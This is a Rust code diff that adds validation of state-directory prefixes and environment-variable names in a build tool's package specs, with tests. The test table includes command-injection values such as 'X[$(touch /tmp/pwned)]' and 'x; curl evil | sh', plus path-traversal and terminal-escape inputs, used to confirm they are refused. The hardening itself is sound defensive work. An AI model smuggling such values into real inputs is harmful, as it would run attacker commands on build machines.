@@ -78,26 +78,28 @@ fn extract_state_wiring(b: &graph::BuildSpec) -> Result<Vec<mfile::StateWiring>,
             Some(mfile::StateWiring { env_var, prefix })
         })
         .map(|w| {
-            // Multi-component prefixes (`foo/bar`) are unused by
-            // any package in `gominimal/pkgs` today. The composition
-            // path's state-dir derivation would silently drop them
-            // while the legacy `SetupForPackages` path would
-            // `mkdir -p` them — a task-vs-session divergence for
-            // the same nickel entry. Reject at extraction so the
-            // divergence never gets exercised; if a package
-            // legitimately needs this shape, both branches will
-            // need to agree on how to handle it and this check can
-            // relax then.
-            if w.prefix.contains('/') {
+            // The prefix is joined onto the state dir and sent to the shell
+            // helpers, so it has to be one directory name. The same rule
+            // (`mfile::is_state_prefix`) and the same text guard the task
+            // path in `graph::SetupForPackages`. It holds for any spec, also
+            // one that no Nickel contract has checked.
+            if !mfile::is_state_prefix(&w.prefix) {
                 return Err(std::io::Error::new(
                     std::io::ErrorKind::InvalidData,
-                    format!(
-                        "package `{}` declares `env_state_wiring` with prefix `{}` \
-                         containing '/'; multi-component prefixes are not supported \
-                         on the session composition path. Split into a single \
-                         component or open an issue if you need this shape.",
-                        b.name, w.prefix,
-                    ),
+                    mfile::state_prefix_refusal(&b.name, &w.prefix),
+                ));
+            }
+            // The composition path exports the same names to the session
+            // shell that the task path does; a non-identifier name would
+            // be evaluated by the helper's `set_env` branch (bash runs
+            // array-subscript arithmetic inside a `declare`d name). The
+            // nickel contract rejects such a name at parse time; this
+            // re-check covers specs that arrive without it, with the
+            // graph's text.
+            if !graph::is_valid_env_var_name(&w.env_var) {
+                return Err(std::io::Error::new(
+                    std::io::ErrorKind::InvalidData,
+                    graph::env_var_refusal(&b.name, &w.env_var),
                 ));
             }
             Ok(w)
@@ -807,47 +809,100 @@ mod tests {
     }
 
     /// A package declaring `env_state_wiring` with a multi-component
-    /// `prefix` (e.g. `"cache/artifacts"`) is rejected at extraction
-    /// with a descriptive `InvalidData` error. Guards the
-    /// task-vs-session divergence — the legacy `SetupForPackages`
-    /// path would silently `mkdir -p` such a prefix, but the
-    /// composition path's state-dir derivation would drop it. Rather
-    /// than pick a behavior arbitrarily, fail loudly so a package
-    /// author sees the "novel schema shape not yet supported"
-    /// message.
+    /// `prefix` (e.g. `"cache/artifacts"`) never reaches the session: the
+    /// legacy `SetupForPackages` path would `mkdir -p` such a prefix, but
+    /// the composition path's state-dir derivation would drop it. The
+    /// `attrs` contract `BuildSpec` applies refuses it when the spec
+    /// loads, so the same spec with a one-name prefix is loaded first: a
+    /// load error for another reason cannot pass for the refusal. The
+    /// refusal's text is checked by `graph::env_setup`'s
+    /// `the_prefix_rule_and_the_contract_agree`; the extraction-time
+    /// check, for a spec no contract saw, by the test after this one.
     #[test]
     fn multi_component_state_wiring_prefix_errors() {
-        let layer = Layer::new_for_test(
-            indoc! {
-                "
-                let {BuildSpec, ..} = import \"minimal.ncl\" in
-                {
-                    name = \"bad\",
-                    build_deps = [],
-                    cmd = \"\",
-                    attrs.env_state_wiring = [
-                      { env_var = \"WEIRD\", prefix = \"cache/artifacts\" },
-                    ],
-                } | BuildSpec
-                "
-            }
-            .to_string(),
-        )
-        .unwrap_or_else(|e| {
+        let spec = |prefix: &str| {
+            format!(
+                "let {{BuildSpec, ..}} = import \"minimal.ncl\" in\n\
+                 {{ name = \"bad\", build_deps = [], cmd = \"\", \
+                 attrs.env_state_wiring = [{{ env_var = \"WEIRD\", prefix = \"{prefix}\" }}] }} \
+                 | BuildSpec\n"
+            )
+        };
+
+        let layer = Layer::new_for_test(spec("artifacts")).unwrap_or_else(|e| {
             e.report_to_stderr();
-            panic!("spec parsing failed");
+            panic!("the one-name prefix did not load, so the test proves nothing");
         });
         let g = graph::Graph::new().ingest(layer).unwrap();
         let bs = g.get(g.by_name("bad").unwrap()).unwrap();
+        assert_eq!(extract_package_attrs(bs).unwrap().state_wiring.len(), 1);
 
-        let err = extract_package_attrs(bs)
-            .expect_err("multi-component prefix should error at extraction");
-        assert_eq!(err.kind(), std::io::ErrorKind::InvalidData);
-        let msg = err.to_string();
-        assert!(msg.contains("bad"), "error should name the package: {msg}");
-        assert!(
-            msg.contains("cache/artifacts"),
-            "error should name the offending prefix: {msg}"
-        );
+        match Layer::new_for_test(spec("cache/artifacts")) {
+            Ok(_) => panic!("a multi-component prefix loaded"),
+            Err(decode::Error::Nickel(_)) => {}
+            Err(e) => {
+                e.report_to_stderr();
+                panic!("the prefix was refused by the reader, not the contract");
+            }
+        }
+    }
+
+    /// The composition path re-checks both fields of a wiring entry for a
+    /// spec that no Nickel contract has checked, such as one that arrives by
+    /// wire. The spec is built by hand, so these cases reach the check
+    /// whatever the contract does. Each refusal names the package, quotes
+    /// the value escaped onto one line, and uses the same text as the graph.
+    #[test]
+    fn a_wiring_entry_the_contract_never_saw_is_refused_at_composition() {
+        let spec = |env_var: &str, prefix: &str| {
+            let mut entry = decode::AttrValue::Map(Default::default());
+            if let decode::AttrValue::Map(m) = &mut entry {
+                m.insert(
+                    "env_var".to_string(),
+                    decode::AttrValue::String(env_var.to_string(), None),
+                );
+                m.insert(
+                    "prefix".to_string(),
+                    decode::AttrValue::String(prefix.to_string(), None),
+                );
+            }
+            // `BuildSpec` has a private field, so it is built from its default
+            let mut b = graph::BuildSpec::default();
+            b.attrs.insert("env_state_wiring".to_string(), entry);
+            b.name = "bad".into();
+            b
+        };
+
+        for (env_var, prefix, quoted) in [
+            (
+                "X[$(touch /tmp/pwned)]",
+                "gocache",
+                "\"X[$(touch /tmp/pwned)]\"",
+            ),
+            ("1A", "gocache", "\"1A\""),
+            ("A\nB", "gocache", "\"A\\nB\""),
+            ("GOCACHE", "..", "\"..\""),
+            ("GOCACHE", "cache/artifacts", "\"cache/artifacts\""),
+            ("GOCACHE", "cache:artifacts", "\"cache:artifacts\""),
+            ("GOCACHE", "x; curl evil | sh", "\"x; curl evil | sh\""),
+            ("GOCACHE", "a\u{1b}[2Jb", "\"a\\u{1b}[2Jb\""),
+        ] {
+            let b = spec(env_var, prefix);
+            let err = extract_package_attrs(&b).expect_err(quoted);
+            assert_eq!(err.kind(), std::io::ErrorKind::InvalidData, "{quoted}");
+            let msg = err.to_string();
+            assert!(msg.contains("`bad`"), "names the package: {msg}");
+            assert!(msg.contains(quoted), "quotes {quoted} escaped: {msg}");
+            assert!(!msg.contains(['\n', '\u{1b}']), "one line: {msg:?}");
+            let graph_text = if graph::is_valid_env_var_name(env_var) {
+                mfile::state_prefix_refusal("bad", prefix)
+            } else {
+                graph::env_var_refusal("bad", env_var)
+            };
+            assert_eq!(msg, graph_text, "the graph's text");
+        }
+
+        let ok = extract_package_attrs(&spec("GOCACHE", "gocache")).expect("a plain entry");
+        assert_eq!(ok.state_wiring.len(), 1);
     }
 }
